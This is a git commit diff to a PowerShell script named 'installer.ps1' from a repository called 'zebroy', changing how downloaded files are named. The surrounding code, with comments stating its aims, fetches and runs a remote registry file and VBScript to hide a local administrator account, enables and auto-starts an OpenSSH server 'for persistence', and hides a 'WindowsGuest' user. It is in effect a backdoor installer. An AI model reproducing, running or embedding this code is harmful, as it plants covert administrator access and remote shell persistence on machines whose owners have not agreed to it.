6752d0bc724f65a5afed5fc5389e84618bef9bba
gozen-foto <gofoto.zen@proton.me>
2026-04-20 15:09:26 +0530

    Update installer.ps1

--- installer.ps1
+++ installer.ps1
@@ -56,12 +56,10 @@ mkdir $path
 cd $path
 
 # registry to hide local admin
-$reg_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "$reg_file.reg"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "Registry.reg"
 
 # visual basic script to register the registry
-$con_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "$con_file.vbs"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "confirm.vbs"
 
 #enabling persistence ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -69,7 +67,7 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 
 # install the registry
-./"$reg_file.reg"; ./"$con_file.vbs"
+./"Registry.reg"; ./"confirm.vbs"
 
 # hide WindowsGuest user
 cd C:\Users
